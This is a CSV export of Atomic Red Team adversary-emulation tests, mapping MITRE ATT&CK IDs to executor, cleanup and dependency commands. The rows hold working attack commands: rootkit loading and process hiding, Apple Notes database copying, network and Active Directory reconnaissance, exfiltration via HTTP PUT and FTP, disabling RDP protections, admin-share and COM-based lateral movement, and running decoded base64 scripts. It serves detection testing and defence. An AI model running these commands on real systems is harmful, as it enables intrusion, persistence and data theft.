"MITRE_ID","File","AtomicTest","ExecutorName","Command","Cleanup","Dependencies"
"T1005","C:\AtomicRedTeam\atomics\T1005\T1005.yaml","Copy Apple Notes database files using AppleScript","sh","osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""/private/tmp""' -e 'set notesFolderPath to (path to home folder as text) & ""Library:Group Containers:group.com.apple.notes:""' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file ""NoteStore.sqlite"", file ""NoteStore.sqlite-shm"", file ""NoteStore.sqlite-wal""} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'","rm ""/private/tmp/NoteStore.sqlite*""",""
"T1006","C:\AtomicRedTeam\atomics\T1006\T1006.yaml","Read volume boot sector via DOS device path (PowerShell)","powershell","$buffer = New-Object byte[] 11
$handle = New-Object IO.FileStream ""\\.\C:"", 'Open', 'Read', 'ReadWrite'
$handle.Read($buffer, 0, $buffer.Length)
$handle.Close()
Format-Hex -InputObject $buffer
",,""
"T1007","C:\AtomicRedTeam\atomics\T1007\T1007.yaml","System Service Discovery - net.exe","command_prompt","net.exe start >> %temp%\service-list.txt
","del /f /q /s %temp%\service-list.txt >nul 2>&1
",""
"T1010","C:\AtomicRedTeam\atomics\T1010\T1010.yaml","List Process Main Windows - C# .NET","command_prompt","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{input_source_code} ""#{input_source_code}""
#{input_source_code}
","del /f /q /s #{input_source_code} >nul 2>&1
","New-Item -Type Directory (split-path ""#{input_source_code}"") -ErrorAction ignore | Out-Null Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile ""#{input_source_code}"" "
"T1012","C:\AtomicRedTeam\atomics\T1012\T1012.yaml","Enumerate COM Objects in Registry with Powershell","powershell","New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt
ForEach($CLSID in Get-Content ""$env:temp\clsids.txt"")
{try{write-output ""$($Position)-$($CLSID)""
write-output ""------------""| out-file $env:temp\T1592.002Test1.txt -append
write-output $($CLSID)| out-file $env:temp\T1592.002Test1.txt -append
$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
$handle | get-member -erroraction silentlycontinue | out-file $env:temp\T1592.002Test1.txt -append
$position += 1} catch{}}
","remove-item $env:temp\T1592.002Test1.txt -force -erroraction silentlycontinue
remove-item $env:temp\clsids.txt -force -erroraction silentlycontinue      
",""
"T1014","C:\AtomicRedTeam\atomics\T1014\T1014.yaml","Loadable Kernel Module based Rootkit","sh","sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko
","sudo rmmod T1014
sudo rm -rf PathToAtomicsFolder/T1014/bin
","sudo apt install make sudo apt install gcc if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi; cp #{rootkit_source_path}/* /tmp/T1014/ cd /tmp/T1014; make mkdir #{rootkit_path} mv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko rm -rf /tmp/T1014 "
"T1014","C:\AtomicRedTeam\atomics\T1014\T1014.yaml","Loadable Kernel Module based Rootkit","sh","sudo modprobe T1014
","sudo modprobe -r T1014
sudo rm /lib/modules/$(uname -r)/T1014.ko
sudo depmod -a
","sudo apt install make sudo apt install gcc if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi; cp #{rootkit_source_path}/* /tmp/T1014 cd /tmp/T1014; make         sudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/ [ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014 sudo depmod -a "
"T1014","C:\AtomicRedTeam\atomics\T1014\T1014.yaml","dynamic-linker based rootkit (libprocesshider)","sh","echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden""
","sed -i ""\:^/usr/local/lib/libprocesshider.so:d"" /etc/ld.so.preload
rm -rf /usr/local/lib/libprocesshider.so /usr/local/bin/evil_script.py /tmp/atomic
","mkdir -p /tmp/atomic && cd /tmp/atomic curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev} make cp libprocesshider.so #{library_path} cp /usr/bin/ping /usr/local/bin/evil_script.py "
"T1014","C:\AtomicRedTeam\atomics\T1014\T1014.yaml","Loadable Kernel Module based Rootkit (Diamorphine)","sh","sudo modprobe diamorphine
ping -c 10 localhost >/dev/null & TARGETPID=""$!""
ps $TARGETPID
kill -31 $TARGETPID
ps $TARGETPID || echo ""process ${TARGETPID} hidden""
","kill -63 1
sudo modprobe -r diamorphine
sudo rm -rf /lib/modules/$(uname -r)/diamorphine.ko /tmp/atomic
sudo depmod -a
","mkdir -p /tmp/atomic && cd /tmp/atomic curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev} make sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/ sudo depmod -a "
"T1016","C:\AtomicRedTeam\atomics\T1016\T1016.yaml","List Open Egress Ports","powershell","$ports = Get-content ""#{port_file}""
$file = ""#{port_file}""
$totalopen = 0
$totalports = 0
New-Item $file -Force
foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect(""allports.exposed"", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = ""$port open"" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = ""$port closed"" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = ""There were a total of $totalopen open ports out of $totalports ports tested.""
$results | Out-File -Encoding ASCII -append $file
Write-Host $results
","Remove-Item -ErrorAction ignore ""#{port_file}""
","New-Item -Type Directory (split-path ""#{port_file}"") -ErrorAction ignore | Out-Null Invoke-WebRequest ""#{portfile_url}"" -OutFile ""#{port_file}"" "
"T1016","C:\AtomicRedTeam\atomics\T1016\T1016.yaml","Adfind - Enumerate Active Directory Subnet Objects","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=subnet) PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe
",,"New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" "
"T1016","C:\AtomicRedTeam\atomics\T1016\T1016.yaml","Qakbot Recon","command_prompt","""#{recon_commands}""
",,"New-Item -Type Directory (split-path ""#{recon_commands}"") -ErrorAction ignore | Out-Null Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat"" -OutFile ""#{recon_commands}"" "
"T1016.001","C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using ping Windows","command_prompt","ping -n 4 8.8.8.8
",,""
"T1016.001","C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using ping freebsd, linux or macos","bash","ping -c 4 8.8.8.8
",,""
"T1016.001","C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using Test-NetConnection in PowerShell (ICMP-Ping)","powershell","Test-NetConnection -ComputerName 8.8.8.8
",,""
"T1016.001","C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using Test-NetConnection in PowerShell (TCP-HTTP)","powershell","Test-NetConnection -CommonTCPPort HTTP -ComputerName www.google.com
",,""
"T1016.001","C:\AtomicRedTeam\atomics\T1016.001\T1016.001.yaml","Check internet connection using Test-NetConnection in PowerShell (TCP-SMB)","powershell","Test-NetConnection -CommonTCPPort SMB -ComputerName 8.8.8.8
",,""
"T1018","C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Remote System Discovery - nltest","command_prompt","nltest.exe /dclist:%userdnsdomain%
",,""
"T1018","C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Remote System Discovery - ping sweep","command_prompt","for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i  
",,""
"T1018","C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Remote System Discovery - sweep","sh","for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo ""192.168.1.$ip UP"" || : ; done
",,""
"T1018","C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Remote System Discovery - adidnsdump","command_prompt","""#{venv_path}\Scripts\pip.exe\Scripts\adidnsdump"" -u #{venv_path}\Scripts\pip.exe -p #{venv_path}\Scripts\pip.exe\Scripts\pip.exe --print-zones #{venv_path}\Scripts\pip.exe\Scripts\pip.exe
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait ; py -m venv ""#{venv_path}"" ; & ""#{venv_path}\Scripts\pip.exe"" install --no-cache-dir adidnsdump 2>&1 | Out-Null "
"T1018","C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Adfind - Enumerate Active Directory Computer Objects","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe
",,"New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" "
"T1018","C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Adfind - Enumerate Active Directory Domain Controller Objects","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe -sc dclist
",,"New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" "
"T1018","C:\AtomicRedTeam\atomics\T1018\T1018.yaml","Enumerate Remote Hosts with Netscan","powershell","cmd /c 'PathToAtomicsFolder\..\ExternalPayloads\' /hide /auto:""$env:temp\T1018NetscanOutput.txt"" /range:'PathToAtomicsFolder\..\ExternalPayloads\'","remove-item ""$env:temp\T1018NetscanOutput.txt"" -force -erroraction silentlycontinue
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\netscan.zip"" ""https://www.softperfect.com/download/files/netscan_portable.zip"" Expand-Archive -LiteralPath ""PathToAtomicsFolder\..\ExternalPayloads\netscan.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\netscan"" "
"T1020","C:\AtomicRedTeam\atomics\T1020\T1020.yaml","IcedID Botnet HTTP PUT","powershell","$fileName = ""C:\temp\T1020_exfilFile.txt""
$url = ""https://google.com""
$file = New-Item -Force $fileName -Value ""This is ART IcedID Botnet Exfil Test""
$contentType = ""application/octet-stream""
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}","$fileName = ""C:\temp\T1020_exfilFile.txt""
Remove-Item -Path $fileName -ErrorAction Ignore",""
"T1020","C:\AtomicRedTeam\atomics\T1020\T1020.yaml","Exfiltration via Encrypted FTP","powershell","$sampleData = ""Sample data for exfiltration test""
Set-Content -Path ""C:\temp\T1020__FTP_sample.txt"" -Value $sampleData
$ftpUrl = ""ftp://example.com""
$creds = Get-Credential -Credential ""[user:password]""
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile ""C:\temp\T1020__FTP_sample.txt"" -Credential $creds
","Remove-Item -Path ""C:\temp\T1020__FTP_sample.txt"" -ErrorAction Ignore
",""
"T1021.001","C:\AtomicRedTeam\atomics\T1021.001\T1021.001.yaml","RDP to DomainController","powershell","$Server=$ENV:logonserver.TrimStart(""\"")
$User = Join-Path $Env:USERDOMAIN $ENV:USERNAME
$Password=""1password2!""
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
mstsc /v:$Server
echo ""RDP connection established""
","$p=Tasklist /svc /fi ""IMAGENAME eq mstsc.exe"" /fo csv | convertfrom-csv
if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
","Write-Host Joining this computer to a domain must be done manually "
"T1021.001","C:\AtomicRedTeam\atomics\T1021.001\T1021.001.yaml","Changing RDP Port to Non Standard Port via Powershell","powershell","Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value 4489
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489
","Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value 3389
Remove-NetFirewallRule -DisplayName ""RDPPORTLatest-TCP-In"" -ErrorAction Ignore 
Get-Service TermService | Restart-Service -Force -ErrorAction Ignore 
",""
"T1021.001","C:\AtomicRedTeam\atomics\T1021.001\T1021.001.yaml","Changing RDP Port to Non Standard Port via Command_Prompt","command_prompt","reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d 4489 /f
netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=4489
","reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d 3389 /f >nul 2>&1
netsh advfirewall firewall delete rule name=""RDPPORTLatest-TCP-In"" >nul 2>&1
net stop TermService /y >nul 2>&1
net start TermService >nul 2>&1
",""
"T1021.001","C:\AtomicRedTeam\atomics\T1021.001\T1021.001.yaml","Disable NLA for RDP via Command Prompt","command_prompt","reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f
","reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 1 /t REG_DWORD -f >nul 2>&1
",""
"T1021.002","C:\AtomicRedTeam\atomics\T1021.002\T1021.002.yaml","Map admin share","command_prompt","cmd.exe /c ""net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator""
",,""
"T1021.002","C:\AtomicRedTeam\atomics\T1021.002\T1021.002.yaml","Map Admin Share PowerShell","powershell","New-PSDrive -name g -psprovider filesystem -root \\Target\C$
",,""
"T1021.002","C:\AtomicRedTeam\atomics\T1021.002\T1021.002.yaml","Copy and Execute File with PsExec","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\"" PathToAtomicsFolder\..\ExternalPayloads\ -accepteula -c PathToAtomicsFolder\..\ExternalPayloads\
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force New-Item -ItemType Directory (Split-Path ""#{psexec_exe}"") -Force | Out-Null Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""#{psexec_exe}"" -Force "
"T1021.002","C:\AtomicRedTeam\atomics\T1021.002\T1021.002.yaml","Execute command writing output to local Admin Share","command_prompt","cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1
",,""
"T1021.003","C:\AtomicRedTeam\atomics\T1021.003\T1021.003.yaml","PowerShell Lateral Movement using MMC20","powershell","[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""localhost"")).Document.ActiveView.ExecuteShellCommand(""c:\windows\system32\calc.exe"", $null, $null, ""7"")
",,""
"T1021.003","C:\AtomicRedTeam\atomics\T1021.003\T1021.003.yaml","PowerShell Lateral Movement Using Excel Application Object","powershell","copy c:\windows\system32\calc.exe 'C:\users\You will need to install Microsoft Excel manually to meet this requirement\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""You will need to install Microsoft Excel manually to meet this requirement""))
$com.ActivateMicrosoftApp(""5"")
","Remove-Item 'C:\users\You will need to install Microsoft Excel manually to meet this requirement\AppData\local\Microsoft\WindowsApps\foxprow.exe'
","Write-Host ""You will need to install Microsoft Excel manually to meet this requirement"" "
"T1021.004","C:\AtomicRedTeam\atomics\T1021.004\T1021.004.yaml","ESXi - Enable SSH via PowerCLI","powershell","Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server atomic.local -User root -Password pass
Get-VMHostService -VMHost atomic.local | Where-Object {$_.Key -eq ""TSM-SSH"" } | Start-VMHostService -Confirm:$false
","Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server atomic.local -User root -Password pass
Get-VMHostService -VMHost atomic.local | Where-Object {$_.Key -eq ""TSM-SSH"" } | Stop-VMHostService -Confirm:$false
","Install-Module -Name VMware.PowerCLI "
"T1021.004","C:\AtomicRedTeam\atomics\T1021.004\T1021.004.yaml","ESXi - Enable SSH via VIM-CMD","command_prompt","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" -batch ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh -l PathToAtomicsFolder\..\ExternalPayloads\ -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" ""vim-cmd hostsvc/enable_ssh""
","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" -batch ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh -l PathToAtomicsFolder\..\ExternalPayloads\ -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" ""vim-cmd hostsvc/disable_ssh""
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1021.006","C:\AtomicRedTeam\atomics\T1021.006\T1021.006.yaml","WinRM Access with Evil-WinRM","powershell","evil-winrm -i PathToAtomicsFolder\..\ExternalPayloads\ -u PathToAtomicsFolder\..\ExternalPayloads\ -p PathToAtomicsFolder\..\ExternalPayloads\",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest  -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe"" https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe $file1= ""PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe"" Start-Process $file1 /S;; gem install evil-winrm"
"T1027","C:\AtomicRedTeam\atomics\T1027\T1027.yaml","Decode base64 Data into Script","sh","if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi;
cat /tmp/encoded.dat | $cmd > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
","rm /tmp/encoded.dat 
rm /tmp/art.sh
","if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64encode -r -""; else cmd=""base64""; fi; echo ""#{shell_command}"" | $cmd > /tmp/encoded.dat "
"T1027","C:\AtomicRedTeam\atomics\T1027\T1027.yaml","Execute base64-encoded PowerShell","powershell","$OriginalCommand = 'Write-Host ""Hey, Atomic!""'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand
",,""
